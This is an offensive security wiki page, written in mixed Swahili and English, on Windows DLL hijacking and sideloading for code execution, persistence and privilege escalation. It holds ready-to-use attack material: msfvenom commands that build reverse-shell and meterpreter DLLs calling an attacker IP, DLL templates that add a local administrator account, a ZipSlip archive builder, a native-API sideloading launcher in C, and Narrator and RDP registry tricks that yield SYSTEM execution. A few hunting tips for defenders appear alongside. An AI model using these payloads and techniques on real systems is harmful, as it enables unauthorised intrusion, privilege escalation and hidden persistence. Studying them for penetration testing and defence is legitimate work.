# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking inahusisha kudanganya application inayoaminika ili ipakie malicious DLL. Neno hili linajumuisha mbinu kadhaa kama **DLL Spoofing, Injection, na Side-Loading**. Hutumika hasa kwa code execution, kupata persistence, na, mara chache zaidi, privilege escalation. Licha ya mwelekeo hapa kuwa juu ya escalation, njia ya hijacking hubaki ile ile katika malengo yote.

### Common Techniques

Mbinu kadhaa hutumiwa kwa DLL hijacking, kila moja ikiwa na ufanisi unaotegemea DLL loading strategy ya application:

1. **DLL Replacement**: Kubadilisha DLL halisi na malicious moja, kwa hiari kutumia DLL Proxying ili kuhifadhi utendaji wa asili wa DLL.
2. **DLL Search Order Hijacking**: Kuweka malicious DLL katika search path kabla ya ile halali, kwa kutumia search pattern ya application.
3. **Phantom DLL Hijacking**: Kuunda malicious DLL ili application ipakie, ikidhani ni required DLL isiyokuwepo.
4. **DLL Redirection**: Kubadilisha search parameters kama `%PATH%` au `.exe.manifest` / `.exe.local` files ili kuelekeza application kwenye malicious DLL.
5. **WinSxS DLL Replacement**: Kubadilisha DLL halali na yenye nia mbaya kwenye directory ya WinSxS, mbinu ambayo mara nyingi huhusishwa na DLL side-loading.
6. **Relative Path DLL Hijacking**: Kuweka malicious DLL katika user-controlled directory pamoja na application iliyokopiwa, ikifanana na Binary Proxy Execution techniques.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading si njia pekee ya kuifanya trusted **.NET Framework** process ipakie attacker code. Ikiwa target executable ni application ya **managed**, CLR pia huangalia **application configuration file** iliyopewa jina la executable (kwa mfano `Setup.exe.config`). Faili hiyo inaweza kufafanua **AppDomainManager** maalum. Ikiwa config inaelekeza kwenye attacker-controlled assembly iliyowekwa kando ya EXE, CLR huipakia **kabla ya normal code path ya application** na kuiendesha ndani ya trusted process.

Kulingana na .NET Framework configuration schema ya Microsoft, `<appDomainManagerAssembly>` na `<appDomainManagerType>` zote lazima ziwepo ili custom manager itumike.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Meneja mdogo:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Practical notes:
- This is **.NET Framework specific** tradecraft. It depends on CLR config parsing, not on the Win32 DLL search order.
- The host must really be a **managed EXE**. Quick triage: `sigcheck -m target.exe`, `corflags target.exe`, or check for the **CLR Runtime Header** in PE metadata.
- The config filename must match the executable name exactly (`<binary>.config`) and usually lives **next to the EXE**.
- This is useful with **signed Microsoft/vendor binaries** because the trusted EXE remains untouched while the malicious managed assembly executes in-process.
- If you already have a writable installer/update directory, AppDomainManager hijacking can be used as the **first stage**, followed by classic DLL sideloading or reflective loading for later stages.

### Hijacking an existing scheduled task to relaunch the sideload chain

For persistence, do not only look for **creating a new task**. Some intrusion sets wait until a legitimate installer creates a **normal updater task** and then **rewrite the task action** so the existing name, author, and trigger stay familiar to defenders.

Reusable workflow:
1. Install/run the legitimate software and identify the task it normally creates.
2. Export the task XML and note the current `<Exec><Command>` / `<Arguments>` values.
3. Replace only the action so the task starts your **trusted host EXE** from a user-writable staging directory, which then side-loads or AppDomain-loads the real payload.
4. Re-register the same task name instead of creating a new obvious persistence artifact.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Why it is stealthier:
- Task name bado inaweza kuonekana halali (kwa mfano vendor updater).
- The **Task Scheduler service** hui-launch, hivyo parent/ancestor validation mara nyingi huona mnyororo unaotarajiwa wa scheduling badala ya `explorer.exe`.
- DFIR teams wanaotafuta tu **new task names** wanaweza kukosa task ambayo registration yake tayari ilikuwepo lakini action yake sasa inaelekeza kwa `%LOCALAPPDATA%`, `%APPDATA%`, au path nyingine inayodhibitiwa na attacker.

Fast hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Linganisha `C:\Windows\System32\Tasks\*` XML na `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata dhidi ya baseline.
- Alert wakati **vendor-looking updater task** ina-execute kutoka **user-writable directories** au ina-launch .NET EXE yenye colocated `*.config` file.

> [!TIP]
> Kwa step-by-step chain inayoweka HTML staging, AES-CTR configs, na .NET implants juu ya DLL sideloading, kagua workflow hapa chini.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

Njia ya kawaida ya kupata missing Dlls ndani ya system ni kuendesha [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) kutoka sysinternals, **kisha kuweka** **filters 2 zifuatazo**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

na kisha onyesha tu **File System Activity**:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

Ikiwa unatafuta **missing dlls kwa ujumla** acha hii ikiendelea kwa **seconds** chache.\
Ikiwa unatafuta **missing dll ndani ya executable maalum** unapaswa kuweka **filter nyingine kama "Process Name" "contains" `<exec name>`, u-i-execute, kisha u-stop capturing events**.

## Exploiting Missing Dlls

Ili kupandisha privileges, nafasi bora tuliyonayo ni kuweza **kuandika dll ambayo privilege process itajaribu ku-load** katika baadhi ya **mahali ambako itatafutwa**. Hivyo, tutaweza **kuandika** dll katika **folder** ambako **dll inatafutwa kabla** ya folder ambako **original dll** ipo (weird case), au tutaweza **kuandika kwenye baadhi ya folder ambako dll itatafutwa** na original **dll haipo** kwenye folder yoyote.

### Dll Search Order

**Ndani ya** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **unaweza kuona jinsi Dlls zinavyo-load specifically.**

**Windows applications** hutafuta DLLs kwa kufuata seti ya **pre-defined search paths**, kwa mpangilio maalum. Tatizo la DLL hijacking hutokea wakati harmful DLL inapowekwa kimkakati katika moja ya directories hizi, kuhakikisha inaloadiwa kabla ya authentic DLL. Suluhisho la kuzuia hili ni kuhakikisha application inatumia absolute paths inaporejelea DLLs inazohitaji.

Unaweza kuona **DLL search order on 32-bit** systems hapa chini:

1. Directory ambamo application ililoado.
2. System directory. Tumia [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function kupata path ya directory hii.(_C:\Windows\System32_)
3. 16-bit system directory. Hakuna function inayopata path ya directory hii, lakini inatafutwa. (_C:\Windows\System_)
4. Windows directory. Tumia [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function kupata path ya directory hii.
1. (_C:\Windows_)
5. Current directory.
6. Directories zilizoorodheshwa kwenye PATH environment variable. Kumbuka kwamba hii haijumuishi per-application path iliyobainishwa na **App Paths** registry key. Key ya **App Paths** haitumiki wakati wa kuhesabu DLL search path.

Huo ndio **default** search order ikiwa **SafeDllSearchMode** imewezeshwa. Iwapo imezimwa current directory hupanda hadi nafasi ya pili. Ili kuzima feature hii, tengeneza **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value na uiweke kuwa 0 (default ni enabled).

Ikiwa [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function inaitwa na **LOAD_WITH_ALTERED_SEARCH_PATH** search huanza katika directory ya executable module ambayo **LoadLibraryEx** ina-loading.

Mwisho, kumbuka kwamba **dll inaweza ku-load kwa kuonyesha absolute path badala ya jina tu**. Katika hali hiyo dll hiyo **itatakiwa kutafutwa tu kwenye path hiyo** (ikiwa dll ina dependencies yoyote, zitatakiwa kutafutwa kama zilivyo-load kwa name).

Kuna njia nyingine za kubadilisha search order lakini sitazieleza hapa.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Tumia **ProcMon** filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) kukusanya majina ya DLL ambayo process inajaribu lakini haiwezi kuyapata.
2. Ikiwa binary inaendeshwa kwa **schedule/service**, kudondosha DLL yenye mojawapo ya majina hayo kwenye **application directory** (search-order entry #1) italoadiwa kwenye execution inayofuata. Katika kisa kimoja cha .NET scanner process ilitafuta `hostfxr.dll` katika `C:\samples\app\` kabla ya ku-load copy halisi kutoka `C:\Program Files\dotnet\fxr\...`.
3. Tengeneza payload DLL (kwa mfano reverse shell) yenye export yoyote: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Ikiwa primitive yako ni **ZipSlip-style arbitrary write**, tengeneza ZIP ambayo entry yake hutoka nje ya extraction dir ili DLL itue kwenye app folder:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Deliver the archive to the watched inbox/share; when the scheduled task re-launches the process it loads the malicious DLL and executes your code as the service account.

### Kulazimisha sideloading kupitia RTL_USER_PROCESS_PARAMETERS.DllPath

Njia ya hali ya juu ya kuathiri kwa uhakika DLL search path ya process mpya inayoundwa ni kuweka uga wa DllPath ndani ya RTL_USER_PROCESS_PARAMETERS wakati wa kuunda process kwa kutumia ntdll’s native APIs. Kwa kutoa directory inayodhibitiwa na mshambuliaji hapa, target process inayotatua imported DLL kwa jina tu (bila absolute path na bila kutumia safe loading flags) inaweza kulazimishwa kupakia malicious DLL kutoka kwenye directory hiyo.

Key idea
- Tengeneza process parameters kwa RtlCreateProcessParametersEx na utoe custom DllPath inayoelekeza kwenye folder yako inayodhibitiwa (kwa mfano, directory ambamo dropper/unpacker yako ipo).
- Unda process kwa RtlCreateUserProcess. Wakati target binary inapotatua DLL kwa jina, loader itazingatia DllPath hii iliyotolewa wakati wa resolution, ikiwezesha sideloading ya kuaminika hata kama malicious DLL haipo karibu na target EXE.

Notes/limitations
- Hii huathiri child process inayoundwa; ni tofauti na SetDllDirectory, ambayo huathiri current process pekee.
- Target lazima iimport au itumie LoadLibrary kwa DLL kwa jina tu (bila absolute path na bila kutumia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs na hardcoded absolute paths haziwezi kutekwa. Forwarded exports na SxS zinaweza kubadilisha precedence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Mfano wa matumizi ya kiutendaji
- Weka `xmllite.dll` yenye nia mbaya (ikitoa functions zinazohitajika au ikifanya proxy kwenda kwenye ile halisi) katika directory yako ya `DllPath`.
- Zindua signed binary inayojulikana kutafuta `xmllite.dll` kwa jina kwa kutumia technique iliyo hapo juu. loader hutatua import kupitia `DllPath` iliyotolewa na hupakia DLL yako.

Technique hii imeonekana in-the-wild ikitumiwa kuendesha multi-stage sideloading chains: launcher ya awali hudondosha helper DLL, kisha huzalisha Microsoft-signed, binary inayoweza hijackiwa yenye custom `DllPath` ili kulazimisha kupakia DLL ya mshambulizi kutoka staging directory.


### .NET AppDomainManager hijacking via `.exe.config`

Kwa **.NET Framework** targets, sideloading inaweza kufanywa **kabla ya `Main()`** bila ku-patch memory kwa kutumia vibaya **`.exe.config`** ya karibu ya application. Badala ya kutegemea tu Win32 DLL search order, mshambulizi huweka legit .NET EXE karibu na malicious config na assemblies moja au zaidi zinazodhibitiwa na mshambulizi.

Jinsi chain inavyofanya kazi:
1. Host EXE inaanza na **CLR inasoma `<exe>.config`**.
2. Config inaweka **`<appDomainManagerAssembly>`** na **`<appDomainManagerType>`** ili runtime iinstantiate `AppDomainManager` inayodhibitiwa na mshambulizi.
3. Manager mbaya hupata **pre-`Main()` execution** ndani ya trusted host process.
4. Config ileile inaweza kulazimisha CLR kutatua local assemblies kwanza (kwa mfano `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) na inaweza kudhoofisha runtime validation/telemetry bila inline patching.

Campaign-style pattern (exact nesting can vary by directive / CLR version):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Why this is useful:
- **`<probing privatePath="."/>`** huweka assembly resolution ndani ya application directory, na kugeuza folda kuwa predictable sideloading surface.
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** huhamisha execution kwenda kwenye attacker code wakati wa CLR initialization, kabla logic halisi ya app kuanza.
- **`<bypassTrustedAppStrongNames enabled="true"/>`** inaweza kuruhusu full-trust app kupakia unsigned au tampered assemblies bila strong-name validation failure.
- **`<publisherPolicy apply="no"/>`** huepuka publisher-policy redirects kwenda assemblies mpya zaidi.
- **`<requiredRuntime ... safemode="true"/>`** hufanya runtime selection kuwa more deterministic.
- **`<etwEnable enabled="false"/>`** ni ya kuvutia hasa kwa sababu **CLR huzima ETW visibility yake yenyewe** kutoka kwenye configuration badala ya implant patching `EtwEventWrite` kwenye memory.

Operational pattern seen in recent campaigns:
- Stage 1 huacha `setup.exe`, `setup.exe.config`, na local assemblies.
- Stage 2 hunakili hivyo vitu kwenda kwenye folda inayoaminika ya **AppData update**, hubadili jina la host kuwa kitu kama `update.exe`, na huiwasha tena kupitia **scheduled task**.
- Stage 3 huthibitisha execution context (kwa mfano expected parent `svchost.exe` kutoka Task Scheduler) kabla ya kupakia final RAT DLL/export.

Hunting ideas:
- Signed au vinginevyo legitimate **.NET executables** zinazoendeshwa zikiwa na suspicious adjacent **`.config`** files katika maeneo ya user-writable.
- `.config` files zenye **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, au **`etwEnable enabled="false"`**.
- Scheduled tasks zinazorudisha kuanzisha renamed update binaries kutoka **`%LOCALAPPDATA%`** au app-specific `\bin\update\` directories.
- Parent/child chains ambapo scheduled task huanzisha trusted .NET host ambayo mara moja hupakia non-vendor assemblies kutoka kwenye directory yake yenyewe.

#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Requirements**:

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

Yeah, the requisites are complicated to find as **by default it's kind of weird to find a privileged executable missing a dll** and it's even **more weird to have write permissions on a system path folder** (you can't by default). But, in misconfigured environments this is possible.\
In the case you are lucky and you find yourself meeting the requirements, you could check the [UACME](https://github.com/hfiref0x/UACME) project. Even if the **main goal of the project is bypass UAC**, you may find there a **PoC** of a Dll hijaking for the Windows version that you can use (probably just changing the path of the folder where you have write permissions).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Na **angalia ruhusa za folda zote ndani ya PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Unaweza pia kuangalia imports za executable na exports za dll kwa:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Kwa mwongozo kamili wa jinsi ya **abuse Dll Hijacking to escalate privileges** ukiwa na ruhusa ya kuandika kwenye **System Path folder** angalia:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)itaangalia kama una write permissions kwenye folda yoyote ndani ya system PATH.\
Zana nyingine za automated zinazovutia za kugundua vulnerability hii ni **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ na _Write-HijackDll._

### Example

Iwapo utapata scenario inayoweza kutumiwa, mojawapo ya mambo muhimu zaidi ili kuiexploit kwa mafanikio itakuwa ni **create a dll that exports at least all the functions the executable will import from it**. Hata hivyo, kumbuka kuwa Dll Hijacking ni muhimu sana ili [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) au kutoka[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Unaweza kupata mfano wa **how to create a valid dll** ndani ya study hii ya dll hijacking inayolenga dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Zaidi ya hayo, katika **sehemu inayofuata** unaweza kupata baadhi ya **basic dll codes** ambazo zinaweza kuwa muhimu kama **templates** au kuunda **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Kwa msingi, **Dll proxy** ni Dll inayoweza **execute your malicious code when loaded** lakini pia **expose** na **work** kama inavyotarajiwa kwa **relaying all the calls to the real library**.

Kwa zana [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) au [**Spartacus**](https://github.com/Accenture/Spartacus) unaweza kwa kweli **indicate an executable and select the library** unalotaka proxify na **generate a proxified dll** au **indicate the Dll** na **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Pata meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Unda mtumiaji (x86 sikuona toleo la x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Yako

Kumbuka kwamba katika hali kadhaa Dll unayokompaili lazima **isafirishe functions kadhaa** ambazo zita-loadiwa na process ya mwathiriwa, ikiwa functions hizi hazipo **binary haitaweza kuziload** na **exploit itafeli**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Mfano wa C++ DLL na uundaji wa mtumiaji</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Mbadala wa C DLL with thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Uchunguzi wa Kesi: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe bado hujaribu kuchunguza DLL ya localization inayoweza kutabirika, maalum kwa lugha, wakati wa kuanza ambayo inaweza hijacked kwa arbitrary code execution na persistence.

Ukweli muhimu
- Njia ya probe (builds za sasa): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Njia ya zamani (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Ikiwa kuna DLL inayoweza kuandikwa na mshambuliaji kwenye njia ya OneCore, inapakiwa na `DllMain(DLL_PROCESS_ATTACH)` hutekelezwa. Hakuna exports zinazohitajika.

Uchunguzi kwa Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Anzisha Narrator na angalia jaribio la kupakia njia iliyo hapo juu.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC kimya
- Hijack ya kawaida itazungumza/kuangazia UI. Ili kubaki kimya, wakati wa attach enumerate Narrator threads, fungua main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) na `SuspendThread` hiyo; endelea kwenye thread yako mwenyewe. Tazama PoC kwa code kamili.

Trigger na persistence kupitia Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Kwa yaliyo hapo juu, kuanzisha Narrator hupakia DLL iliyopandwa. Kwenye secure desktop (logon screen), bonyeza CTRL+WIN+ENTER kuanzisha Narrator; DLL yako ina-execute kama SYSTEM kwenye secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Ruhusu classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Fanya RDP kwenye host, kwenye logon screen bonyeza CTRL+WIN+ENTER ili ku-launch Narrator; DLL yako ina-execute kama SYSTEM kwenye secure desktop.
- Execution husimama RDP session ikifungwa—inject/migrate haraka.

Bring Your Own Accessibility (BYOA)
- Unaweza ku-clone built-in Accessibility Tool (AT) registry entry (mfano, CursorIndicator), uhariri ili ielekeze kwenye arbitrary binary/DLL, u-import, kisha uweke `configuration` kwa jina hilo la AT. Hii huproxy arbitrary execution chini ya Accessibility framework.

Notes
- Kuandika chini ya `%windir%\System32` na kubadilisha HKLM values kunahitaji admin rights.
- Logic yote ya payload inaweza kuishi ndani ya `DLL_PROCESS_ATTACH`; hakuna exports zinazohitajika.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Kisa hiki kinaonyesha **Phantom DLL Hijacking** katika Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), inayofuatiliwa kama **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` iko `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` ina-run kila siku saa 9:30 AM chini ya context ya user aliyeingia.
- **Directory Permissions**: Inaweza kuandikwa na `CREATOR OWNER`, kuruhusu local users kudrop arbitrary files.
- **DLL Search Behavior**: Hujaribu kupakia `hostfxr.dll` kutoka working directory yake kwanza na hu-log "NAME NOT FOUND" ikiwa haipo, ikionyesha local directory search precedence.

### Exploit Implementation

Attacker anaweza kuweka malicious `hostfxr.dll` stub kwenye directory hiyo hiyo, kutumia DLL inayokosekana ili kupata code execution chini ya context ya user:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. Kama mtumiaji wa kawaida, dondosha `hostfxr.dll` ndani ya `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Subiri scheduled task iendeshwe saa 9:30 AM chini ya context ya mtumiaji wa sasa.
3. Ikiwa administrator ameingia wakati task inaendeshwa, malicious DLL itaendeshwa katika session ya administrator kwenye medium integrity.
4. Unganisha standard UAC bypass techniques ili kupandisha kutoka medium integrity hadi SYSTEM privileges.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors mara kwa mara huunganisha MSI-based droppers na DLL side-loading ili kuendesha payloads chini ya trusted, signed process.

Chain overview
- Mtumiaji anapakua MSI. CustomAction inaendeshwa kimya kimya wakati wa GUI install (mfano, LaunchApplication au kitendo cha VBScript), ikirekebisha next stage kutoka embedded resources.
